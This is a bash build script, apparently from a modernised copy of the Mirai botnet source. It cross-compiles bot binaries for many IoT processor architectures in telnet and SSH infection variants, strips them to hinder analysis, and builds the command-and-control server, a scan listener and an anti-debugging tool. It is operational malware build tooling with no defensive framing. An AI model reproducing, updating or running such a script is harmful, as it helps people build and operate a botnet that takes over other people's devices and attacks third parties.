#!/bin/bash

FLAGS=""

function compile_bot {
    local arch="$1"
    local output="$2"
    local extra_flags="$3"
    
    # Use modern GCC with updated flags
    "${arch}-gcc" -std=c11 ${extra_flags} bot/*.c \
        -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections \
        -Wl,--gc-sections -Wl,--as-needed \
        -o "release/${output}" \
        -DMIRAI_BOT_ARCH=\""${arch}"\" \
        -D_FORTIFY_SOURCE=2 -fstack-protector-strong
    
    # Strip the binary
    "${arch}-strip" "release/${output}" -S --strip-unneeded \
        --remove-section=.note.gnu.gold-version \
        --remove-section=.comment \
        --remove-section=.note \
        --remove-section=.note.gnu.build-id \
        --remove-section=.note.ABI-tag \
        --remove-section=.jcr \
        --remove-section=.got.plt \
        --remove-section=.eh_frame \
        --remove-section=.eh_frame_ptr \
        --remove-section=.eh_frame_hdr 2>/dev/null || true
}

# Check arguments
if [ $# -eq 2 ]; then
    if [ "$2" == "telnet" ]; then
        FLAGS="-DMIRAI_TELNET"
    elif [ "$2" == "ssh" ]; then
        FLAGS="-DMIRAI_SSH"
    else
        echo "Invalid build type: $2"
        echo "Usage: $0 <debug | release> <telnet | ssh>"
        exit 1
    fi
elif [ $# -ne 2 ]; then
    echo "Usage: $0 <debug | release> <telnet | ssh>"
    exit 1
fi

if [ "$1" == "release" ]; then
    # Clean previous builds
    rm -f release/mirai.* release/miraint.*
    
    # Build Go components
    go build -o release/cnc cnc/*.go
    
    # Compile bots with modern flags
    compile_bot "i586" "mirai.x86" "${FLAGS} -DKILLER_REBIND_SSH -static"
    compile_bot "mips" "mirai.mips" "${FLAGS} -DKILLER_REBIND_SSH -static"
    compile_bot "mipsel" "mirai.mpsl" "${FLAGS} -DKILLER_REBIND_SSH -static"
    compile_bot "arm-linux-gnueabi" "mirai.arm" "${FLAGS} -DKILLER_REBIND_SSH -static"
    compile_bot "arm-linux-gnueabi" "mirai.arm5n" "${FLAGS} -DKILLER_REBIND_SSH"
    compile_bot "arm-linux-gnueabihf" "mirai.arm7" "${FLAGS} -DKILLER_REBIND_SSH -static"
    compile_bot "powerpc" "mirai.ppc" "${FLAGS} -DKILLER_REBIND_SSH -static"
    compile_bot "sparc" "mirai.spc" "${FLAGS} -DKILLER_REBIND_SSH -static"
    compile_bot "m68k" "mirai.m68k" "${FLAGS} -DKILLER_REBIND_SSH -static"
    compile_bot "sh4" "mirai.sh4" "${FLAGS} -DKILLER_REBIND_SSH -static"
    
    # Compile internet variants
    compile_bot "i586" "miraint.x86" "-static"
    compile_bot "mips" "miraint.mips" "-static"
    compile_bot "mipsel" "miraint.mpsl" "-static"
    compile_bot "arm-linux-gnueabi" "miraint.arm" "-static"
    compile_bot "arm-linux-gnueabi" "miraint.arm5n" ""
    compile_bot "arm-linux-gnueabihf" "miraint.arm7" "-static"
    compile_bot "powerpc" "miraint.ppc" "-static"
    compile_bot "sparc" "miraint.spc" "-static"
    compile_bot "m68k" "miraint.m68k" "-static"
    compile_bot "sh4" "miraint.sh4" "-static"
    
    # Build scan listener
    go build -o release/scanListen tools/scanListen.go

elif [ "$1" == "debug" ]; then
    # Create debug directory if it doesn't exist
    mkdir -p debug
    
    # Debug builds with modern GCC
    gcc -std=c11 bot/*.c -DDEBUG ${FLAGS} -static -g -O0 \
        -Wall -Wextra -fstack-protector-strong \
        -o debug/mirai.dbg
    
    # Cross-compile debug versions
    mips-linux-gnu-gcc -std=c11 -DDEBUG bot/*.c ${FLAGS} -static -g -O0 \
        -o debug/mirai.mips 2>/dev/null || echo "mips-gcc not available"
    
    arm-linux-gnueabi-gcc -std=c11 -DDEBUG bot/*.c ${FLAGS} -static -g -O0 \
        -o debug/mirai.arm 2>/dev/null || echo "arm-gcc not available"
    
    arm-linux-gnueabihf-gcc -std=c11 -DDEBUG bot/*.c ${FLAGS} -static -g -O0 \
        -o debug/mirai.arm7 2>/dev/null || echo "armhf-gcc not available"
    
    sh4-linux-gnu-gcc -std=c11 -DDEBUG bot/*.c ${FLAGS} -static -g -O0 \
        -o debug/mirai.sh4 2>/dev/null || echo "sh4-gcc not available"
    
    # Build tools
    gcc -std=c11 tools/enc.c -g -O0 -Wall -Wextra -o debug/enc
    gcc -std=c11 tools/nogdb.c -g -O0 -Wall -Wextra -o debug/nogdb
    gcc -std=c11 tools/badbot.c -g -O0 -Wall -Wextra -o debug/badbot
    
    # Build Go components
    go build -o debug/cnc cnc/*.go
    go build -o debug/scanListen tools/scanListen.go

else
    echo "Unknown parameter $1"
    echo "Usage: $0 <debug | release> <telnet | ssh>"
    exit 1
fi
